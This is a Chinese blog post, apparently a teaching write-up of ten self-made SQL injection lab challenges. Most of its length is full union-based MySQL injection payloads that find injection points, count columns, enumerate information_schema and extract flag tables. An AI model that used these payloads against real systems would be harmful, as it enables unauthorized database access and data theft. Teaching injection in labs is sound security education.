---
title: 关于10道自己出的 sqli-wp
date: 2018-03-20 21:13:31
categories: Other
tags:
 - Other
description:
---
传授学弟学妹们sqli中的知识。写一下几个题目思路和过程。
对于基本注入的步骤有一个和很好的总结文章[MySQL 手工注入之基本步骤](http://www.sqlsec.com/2018/01/select.html)

<!-- more -->
因为基于MYSQL的sqli，所以不用判断数据库类型,正常会扫描端口或者凭借站点类型等等来判断数据库类型。
前几题会分析的比较详细，后面会少一些，不解释其中的一些重复的原因了。e

## sqli-white

### str
由于白盒测试，能看见执行的sql语句，那么直接根据id参数来注入


#### 判断注入点
判断注入点可以采用很多形式，这边使用`引号闭合SQL语句`,也成为内联式。
传入参数`?id=0' or '1'='1`后，实际执行的SQL语句是`SELECT * FROM users WHERE id='0' or '1'='1' LIMIT 0,1`
先来分析这个SQL语句
先说`LIMIT 0,1`，他的作用就是取查询的第一条数据，`SELECT * FROM users`能查询N条数据，但是你想要取其中第一条怎么办，那么使用`LIMIT 0,1`。如果我要取第九条数据呢?`LIMIT 8,1`即可。

在来分析where后面的语句
```
id='0' or '1'='1'
false or '1'='1'
flase or true
true

根据运算优先级，先从左到右运算=
id是主键，一般都是从1开始自增长，所以不存在0，既 id=0 不存在返回false
在运算后面的'1'='1'返回true
在运算or，or运算如果左边为true，那么右边直接不运算直接返回true，如果不为，在运算右边
现在右边是true，所以也最后也返回true


```
WHERE条件永真，所以匹配所有数据，就等于`SELECT * FROM users LIMIT 0,1`，也就取得了第一条数据。
那么页面中会显示users表中的第一个条数据的内容。

那么这能说明什么?
如果我插入这样的语句，显示了第一条数据，那么说明我插入的SQL语句被执行了。
如果还觉得不足以证明，可以在传入参数`?id=0' or '2'='1`，执行的语句是`SELECT * FROM users WHERE id='0' or '2'='1' LIMIT 0,1`
那么`'2'='1'`永远不成立，所以where返回false，所以查询数据必定为空。那么页面中必定没有数据显示。
就证明了这个是一个注入点。并且为字符型的。因为单引号的存在。

#### 得到列数
那么我们已经确定这边是一个注入点了，可以利用sql的order by来知道users表的列数。为什么要确定列数？在下一步会有需求。
这边我们利用终止式来注入，因为注入语句的单引号和LIMIT0,1始终会影响我们注入的语句。我们可以直接把后面的语句注释掉。
在MYSQL中 # 和 -- 都可以注释后面的语句。
**注意： # 符号在GET请求中必须经过URL编码变为%23,例如：**
 - `?id=1' %23`
原因是URL通用格式为`scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]`
 `#`符号规定在整个URL中起锚点作用，也是在URL中属于最后一位。如果你直接在GET请求中输入#，会被认为是一个锚点。而不是自己想要传递的参数。
**注意： -- 注释符在GET请求中必须在后面加一些字符，例如：**
 - `?id=1'--%20`
 - `?id=1'-- -`
 - `?id=1'-- a`
 为什么要加呢，猜测是不符合MYSQL中注释符的语法规范，如果单单`--`是无法起到注释的作用。(待明确)

回归正题，我们要利用order by 确定列数。
传入参数`?id=1' order by 3 %23`，最终执行的的sql为`SELECT * FROM users WHERE id='1' order by 3 #' LIMIT 0,1`
由于注释符注释了后面的，所以就其实就是`SELECT * FROM users WHERE id='1' order by 3`
order by 后面一般都是输入列名来排序，但是如果输入数字会怎么样？
如果输入的是1，那么其实就是按照查询的第一列排序，如果是2，就是按照第二列排序，如果是3，就是按照第3列。如果是999呢？
因为没有第999列，所以SQL语句执行会报错，也就执行失败，无法返回数据。也就是说
```sql
SELECT id,username FROM users ORDER BY 1   # 按照第一列，就是id去排序，并返回数据
SELECT id,username FROM users ORDER BY 2   # 按照第二列，就是username去排序，并返回数据
SELECT id,username FROM users ORDER BY 3   # 不存在第三列，SQL语句执行失败，返回错误
```
那么我们就可以根据SQL语句是否执行成功来判别这条SQL语句的列数是几。
```sql
?id=1' order by 3 %23  # 页面没有报错，列数最少有3列'
?id=1' order by 4 %23  # 页面报错，没有数据显示，列数为3列'
```
根据以上信息，我们就能知道，users表的列数为3列。


#### 联合查询
如果我想知道他数据库里面其他表里面的数据，或者数据库信息。我们该怎么办？
没错，我们要拿他数据库内的数据。那么可以使用联合查询
在MYSQL中如果我们想要把两个表的数据放在一起，我们要怎么办?
利用`union`，那么我们怎么使用他，很简单
![1](1.png)
没错，其中的过程很简单，其实就是先运行了`select * from users where id =1`，然后在运行`select * from users where id =2`
最后把两张表加在一起，显示了结果。
那么好用的东西难道没有限制吗？
`union`有着几条非常重要的条件就是
 - Union必须由两条或者两条以上的SELECT语句组成，语句之间使用Union链接
 - Union中的每个查询必须包含相同的列、表达式或者聚合函数，他们出现的顺序可以不一致（这里指查询字段相同，表不一定一样）
 - 列的数据类型必须兼容，兼容的含义是必须是数据库可以隐含的转换他们的类型

可能太长了不理解，简单的说就是查询的列数要相同，列的类型要尽量相同。

所以我们需要先用order by 去确定列数。当然我们也可以去猜他的列数。
接下来我们实际使用union 来回显数据。
![2](2.png)

这边有两个细节
1. `id='0'` 因为只查询一条数据，所以我们要前者不成立，在联合表之后也只存在一条数据，才会看见自己注入的内容。
2. `SELECT 1,2,3`,为什么是`1,2,3`，据我了解，数字和`NULL`在UNION中兼容性更强，更不容易出现别的报错，所以一般使用他们来进行测试。

ok，我们能直接看到自己的数据内容了。

#### 查询数据库版本、名
那么我们想要查询一下当前数据库版本和数据库名是什么，怎么办?

这边你最起码要知道MYSQL中常用的函数。这边用了`version()，database()`

![3](3.png)

边能看见我们想要看见的数据。

#### 查询所有数据库名
一般的查询语句都是`SELECT * FROM table_name`
那么接下来可能会碰见问题，我们怎么知道有哪些表，我们怎么知道表有哪些列，我们怎么知道其他数据库名?

在MYSQL5.0之后，MYSQL中存在一张表叫`information_schema`。
>这个数据库中保存了MySQL服务器所有数据库的信息。
如数据库名，数据库的表，表栏的数据类型与访问权限等。
再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，
每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。

 - information_schema的表schemata中的列schema_name记录了所有数据库的名字
 - information_schema的表tables中的列table_schema记录了所有数据库的名字
 - information_schema的表tables中的列table_name记录了所有数据库的表的名字
 - information_schema的表columns中的列table_schema记录了所有数据库的名字
 - information_schema的表columns中的列table_name记录了所有数据库的表的名字
 - information_schema的表columns中的列column_name记录了所有数据库的表的列的名字

也就是说，我们如果有查询这个表的权限，我们就可以得到整个数据库的结构体系是什么样子的。

那么我们实际怎么去做呢
`?id=0' union select 1,2,schema_name from information_schema.schemata %23`
之前提到了，其他union就是多个select，并且将表合并，也就是说后面也可以执行一条完整的sql语句
那么直接查询`information_schema.schemata`里面的`schema_name`字段。里面存储的所有数据库的名字。
但是这边有一个问题。
**如果存在多个数据库怎么办?**
有人可能还没明白，如果存在多个数据库，那么就存在多条记录。但是你这边只能查询一条记录。
有人说可以用之前提到的LIMIT，对，可以使用。但是只能一条一条的去查，如果有100000个数据库，那么就需要用脚本来实现，效率也不高。

这边有更好的方法，就是`group_concat()`，它可以把查询的结果并到一列中并且默认用逗号隔开(用什么符号隔开可以自定义)。
使用方式是这样`SELECT group_concat(id) FROM users`,我们就会看见所有的id按照，号隔开。

![4](4.png)

那么继续构建我们的payload
`?id=0' union select 1,2,group_concat(schema_name) from information_schema.schemata %23`
就能看见所有的库名了。
很![5](5.png)
好，接下来就是知道了数据库只有两个。我们就可以放心的找其中的一个。

#### 查询数据库所有表名
那么我们根据
 - information_schema的表tables中的列table_schema记录了所有数据库的名字
 - information_schema的表tables中的列table_name记录了所有数据库的表的名字

构建payload
`?id=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='sqli23333' %23`
就可以得到所有表名
![6](6.png)

#### 查询表的所有列名
根据
 - information_schema的表columns中的列table_schema记录了所有数据库的名字
 - information_schema的表columns中的列table_name记录了所有数据库的表的名字
 - information_schema的表columns中的列column_name记录了所有数据库的表的列的名字

构建payload
`?id=0' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='flag' %23`
就可以得到所有列名
#![7](7.png)

#### 查询实际数据
经过上面，我们就知道了所有数据库名、表名、列名
那么我们就可以很轻松的构建查询语句，得到想要的数据
`?id=0' union select 1,2,group_concat(flag) from flag %23`
![8](8.png)


#### 总结
上面涉及到以下知识点内容
 - 如何判断注入点
   - 什么是引号闭合SQL语句(内联式)
   - LIMIT是什么
   - 分析where语句中的运算
 - 得到列数
   - 终止式注入
   - GET请求中注释符的使用注意点
   - 为什么order by能确定列数
 - 联合查询
   - 联合查询是什么
   - union的注意点
   - 怎么利用联合查询回显想要查询的数据
   - 为什么要id=0
 - 查询数据库版本、名
   - MYSQL中version()和database()
 - 查询所有数据库名
   - information_schema库是什么
   - 里面存有什么
   - 怎么利用他得到数据内容
   - 当页面中只回显一条记录，但是查询了多条数据(group_concat()的使用)

<br>
### num
由于白盒测试，能看见执行的SQL语句。根据sql语句，我们直接能判断是数字型的注入。

#### 确定注入点
但是在看不到的情况下，我们怎么判断
当传入参数`?id=1`时，页面会显示第一条数据
那么我传入`?id=2-1`时，页面如果也回显了第一条数据，那么说明参数被当作SQL语句执行了。
```sql
SELECT * FROM users WHERE id = 2-1
SELECT * FROM users WHERE id = 1
```
我们就能凭借它来确定这个数字型的注入点了。
这边还有一个细节，`?id=1+1`可以吗？
答案是不行，因为`+号`经过浏览器传输后会被转换成空格，也就是说当你传输的参数是`?id=1+1`
那么最后执行的语句是`SELECT * FROM users WHERE id=1 1 LIMIT 0,1`
好的，数据库必定会报错。

#### 得到数据流程
接下来就是一样的流程
```sql
得到列数
?id=1 ORDER BY 3 %23  # 页面正常，显示第一条数据
?id=1 ORDER BY 4 %23  # 页面报错，确定列数为3列

联合查询注入
?id=0 UNION SELECT 1,2,3 %23    # 页面中显示1，2，3的数据

查询当前数据库版本和数据库名
?id=0 UNION SELECT 1,version(),database() %23    # 页面回显数据

查询当前数据库下的所有表名
?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli10086' %23

查询该表中所有的列名
?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns where table_name='what_flag' %23

查询实际数据
?id=0 UNION SELECT 1,2,group_concat(flag_what) FROM what_flag %23

```


<br>
### search
由于白盒测试，能看见执行的SQL语句。根据sql语句，我们直接能判断是搜索型的注入。

#### 确定注入点
但是在看不到的情况下，我们怎么判断
当传入参数`?id=a' or 1=1 %23`时。页面只显示一条数据，说明我们传入的参数成功被当作SQL语句被执行了。
我们来分析一下SQL会怎么执行。
`SELECT * FROM users WHERE id LIKE '%a' or 1=1 #%' LIMIT 0,1`
最后的LIMIT被注释了直接忽略，直接看WHERE。首先会先执行 `id LIKE '%a'` %号是通配符，这句话的含义是 匹配id字段以a结尾的数据。%号可以理解为任意字符
因为id是主键，并且为数字，所以不可能匹配上。那么会变成WHERE后面的条件会变成
`false or 1=1`，那么最终肯定会返回true。
也就是语句变成`SELECT * FROM users`，会返回users表中的所有数据。
![10](10.png)
那么这边为什么会只显示一条？
这就跟里面内部的代码有关了。很多情况下，页面中最终的效果和后端代码以及SQL语句都相关。这边就不深究。当你试过PHP，自然会很理解。

那么以上我们基本就可以确定了注入点，如果还不确定可以试一试`?id=a' or 2=1 %23`。页面中必定不会显示任何数据。


<br>
#### 得到数据流程
接下来就是一样的流程
```sql
得到列数
?id=a' or 1=1 ORDER BY 3 %23  # 页面正常，显示第一条数据'
?id=a' or 1=1 ORDER BY 4 %23  # 页面报错，确定列数为3列'

联合查询注入
?id=a' UNION SELECT 1,2,3 %23    # 页面中显示1，2，3的数据'

查询当前数据库版本和数据库名
?id=a' UNION SELECT 1,version(),database() %23    # 页面回显数据'

查询当前数据库下的所有表名
?id=a' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli12580' %23                #'

查询该表中所有的列名
?id=a' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns where table_name='flagx' %23                #'

查询实际数据
?id=a' UNION SELECT 1,2,group_concat(flagc) FROM flagx %23                     #'
```

<br>
### other
由于白盒测试，能看见执行的SQL语句。根据sql语句，我们直接能判断是字符型的注入，只不过外面加着括号。

#### 确定注入点
在SQL注入中，我们无法看见别人构建复杂的SQL语句结构，只能根据经验去判断，去猜测。也就是说可能什么形式都有。你有你猜不到，没有你想不到。

括号在其中只是起到先执行的作用，也就是说在这条SQL语句中，有没有括号，没有任何影响。但是在注入的过程中，其实影响比较大。因为你要猜中他的构成中带有括号。

传入参数`?id=0') or 1=1 %23`，永真条件，所以页面中必定出现第一条数据。确定注入点成功。

#### 得到数据流程
接下来就是一样的流程
```sql
得到列数
?id=1') ORDER BY 3 %23  # 页面正常，显示第一条数据'
?id=1') ORDER BY 4 %23  # 页面报错，确定列数为3列'

联合查询注入
?id=0') UNION SELECT 1,2,3 %23    # 页面中显示1，2，3的数据'

查询当前数据库版本和数据库名
?id=0') UNION SELECT 1,version(),database() %23    # 页面回显数据'

查询当前数据库下的所有表名
?id=0') UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli12131' %23                #'

查询该表中所有的列名
?id=0') UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns where table_name='this_flag' %23                 #'

查询实际数据
?id=0') UNION SELECT 1,2,group_concat(flag_this) FROM this_flag %23                                      #'

```


<br>
### other2
由于白盒测试，能看见执行的SQL语句。根据sql语句，我们直接能判断是数字型的注入。只不过多了更多的括号

#### 确定注入点
原理相同，只需要用同等的右括号来完成就可以。
传入参数`?id=2-1)))) %23`，页面返回第一条数据。说明传入参数被当作SQL语句执行。那么确定注入点。

#### 得到数据流程
接下来就是一样的流程
```sql
得到列数
?id=1)))) ORDER BY 3 %23  # 页面正常，显示第一条数据
?id=1)))) ORDER BY 4 %23  # 页面报错，确定列数为3列

联合查询注入
?id=0)))) UNION SELECT 1,2,3 %23    # 页面中显示1，2，3的数据

查询当前数据库版本和数据库名
?id=0)))) UNION SELECT 1,version(),database() %23    # 页面回显数据

查询当前数据库下的所有表名
?id=0)))) UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli10010' %23

查询该表中所有的列名
?id=0)))) UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns where table_name='f10010lag' %23

查询实际数据
?id=0)))) UNION SELECT 1,2,group_concat(f10010lag) FROM f10010lag %23

```

<br>
<br>

## sqli-black




### guess1

#### 确定注入点
开始我们第一个，猜测别人的SQL语句怎么写的。直接开始测试
```sql
?id=2-1   #????一下就中奖了，页面回显ID为1的数据，说明语句被当作SQL语句执行
?id=3-2   # 在确认一下
```
好的，可以直接开始得到数据的流程了

#### 得到数据流程
接下来就是一样的流程
```sql
得到列数
?id=1 ORDER BY 3 %23  # 页面正常，显示第一条数据
?id=1 ORDER BY 4 %23  # 页面报错，确定列数为3列

联合查询注入
?id=0 UNION SELECT 1,2,3 %23    # 页面中显示1，2，3的数据

查询当前数据库版本和数据库名
?id=0 UNION SELECT 1,version(),database() %23    # 页面回显数据

查询当前数据库下的所有表名
?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli_hahah' %23

查询该表中所有的列名
?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns where table_name='fllllaaaggg' %23

查询实际数据
?id=0 UNION SELECT 1,2,group_concat(f4ag) FROM fllllaaaggg %23

```

<br>
### guess2

#### 确定注入点
直接开始测试
```sql
?id=2-1   #页面回显ID=2的数据，显然不是数字型。至于为什么是第二条数据，可以google MYSQL隐式转换
?id=0' or 1=1 %23   #' 页面回显第一条数据，说明注入成功
?id=0' or 2=1 %23   #' 页面没有回显数据，说明注入成功
如果说这样就确定是字符型的话，还不够严谨，如果有ID=10的数据存在，那么 ?id=0' or 2=1 %23  搜索型有可能会回显ID=10的数据的。'
并且搜索型可能是 LIKE '%aaa'  或者 LIKE 'aaa%'  

在这个环境中，不过也没必要非要探究到底是搜索型还是字符型
因为你已经将后面的注释了，也就是说前面只要返回FALSE，后面的语句都可执行。只要没有过滤的话。

不过我们还是能用实践来证明出其他的一些东西
?id=1' %23  #页面回显ID=1的数据'，说明前面不可能带有%号通配符，如果有，不可能返回是ID=1的数据。

说明前面必定没有带有%符，SQL语句可能是
SELECT  * FROM users WHERE id LIKE 'aaa%'
SELECT  * FROM users WHERE id = 'aaa'

总之，其实这不是很好区别，但是我们的探究点不再这，SQL语句千奇百怪。
```
好的，可以直接开始得到数据的流程了

#### 得到数据流程
接下来就是一样的流程
```sql
得到列数
?id=1' ORDER BY 3 %23  # 页面正常，显示第一条数据'
?id=1' ORDER BY 4 %23  # 页面报错，确定列数为3列'

联合查询注入
?id=0' UNION SELECT 1,2,3 %23    # 页面中显示1，2，3的数据'

查询当前数据库版本和数据库名
?id=0' UNION SELECT 1,version(),database() %23    # 页面回显数据'

查询当前数据库下的所有表名
?id=0' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli_heheh' %23                #'

查询该表中所有的列名
?id=0' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns where table_name='f111ag' %23                #'

查询实际数据
?id=0' UNION SELECT 1,2,group_concat(f1ag) FROM f111ag %23                     #'
```

<br>
### guess3

#### 确定注入点
直接开始测试
```sql
?id=2-1   # 页面没有数据，注入失败，猜测不是数字型
?id=1' %23  # 页面返回正常的数据，可能是字符型，也可能是搜索型'
?id=0' or 1=2 %23  # 页面返回ID=10的数据，那么证明必定是搜索型，因为前面有%'

实际的SQL语句必定是
SELECT  * FROM users WHERE id LIKE '%0' or 1=2 %23   # ID=10 满足条件

```
好的，可以直接开始得到数据的流程了

#### 得到数据流程
接下来就是一样的流程
```sql
得到列数
?id=a' ORDER BY 3 %23  # 页面正常，显示第一条数据'
?id=a' ORDER BY 4 %23  # 页面报错，确定列数为3列'

联合查询注入
?id=a' UNION SELECT 1,2,3 %23    # 页面中显示1，2，3的数据'

查询当前数据库版本和数据库名
?id=a' UNION SELECT 1,version(),database() %23    # 页面回显数据'

查询当前数据库下的所有表名
?id=a' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli_lalal' %23                #'

查询该表中所有的列名
?id=a' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns where table_name='fflaglag' %23                #'

查询实际数据
?id=a' UNION SELECT 1,2,group_concat(fflaglag) FROM fflaglag %23                     #'
```

<br>
### guess4

#### 确定注入点
直接开始测试
```sql
?id=2-1   # 显示第二条数据，其实已经证明了肯定带有引号
?id=0' or 1=1 %23 # 页面出现了报错，因为我们后面做了注释，所以如果SQL语句出错也是or前面的问题 '
?id=0') or 1=1 %23 # ok，运气很好，猜到了括号的存在，页面回显第一条数据，可以确认注入点了'

```
好的，可以直接开始得到数据的流程了

#### 得到数据流程
接下来就是一样的流程
```sql
得到列数
?id=1') ORDER BY 3 %23  # 页面正常，显示第一条数据'
?id=1') ORDER BY 4 %23  # 页面报错，确定列数为3列'

联合查询注入
?id=0') UNION SELECT 1,2,3 %23    # 页面中显示1，2，3的数据'

查询当前数据库版本和数据库名
?id=0') UNION SELECT 1,version(),database() %23    # 页面回显数据'

查询当前数据库下的所有表名
?id=0') UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli_xixix' %23                #'

查询该表中所有的列名
?id=0') UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns where table_name='fiag' %23                 #'

查询实际数据
?id=0') UNION SELECT 1,2,group_concat(fcag) FROM fiag %23                                      #'

```

<br>
### guess5

#### 确定注入点
直接开始测试
```sql
?id=2-1   # 第二条数据，基本确定带有单引号
?id=0' or 1=1  %23   # 页面没有报错，也没有数据显示'
?id=1' %23  # 显示了第一条数据，说明没有带有括号，如果有的话，肯定报错了'
如果是搜索型的话也不可能，因为搜索型，第二条语句肯定也会回显数据，毕竟永真
所以开始尝试用别的符号
?id=0" or 1=1  %23 # ok，回显数据，发现是使用双引号，确定了注入点开搞 "

```
好的，可以直接开始得到数据的流程了

#### 得到数据流程
接下来就是一样的流程
```sql
得到列数
?id=1" ORDER BY 3 %23  # 页面正常，显示第一条数据"
?id=1" ORDER BY 4 %23  # 页面报错，确定列数为3列"

联合查询注入
?id=0" UNION SELECT 1,2,3 %23    # 页面中显示1，2，3的数据"

查询当前数据库版本和数据库名
?id=0" UNION SELECT 1,version(),database() %23    # 页面回显数据"

查询当前数据库下的所有表名
?id=0" UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli_yoyoy' %23                        #"

查询该表中所有的列名
?id=0" UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns where table_name='f4alg' %23                        #"

查询实际数据
?id=0" UNION SELECT 1,2,group_concat(f4alg) FROM f4alg %23                                   #"

```


<br>
## 总结
如果你能写出自己的wp，那么说明你可能真的理解了吧。
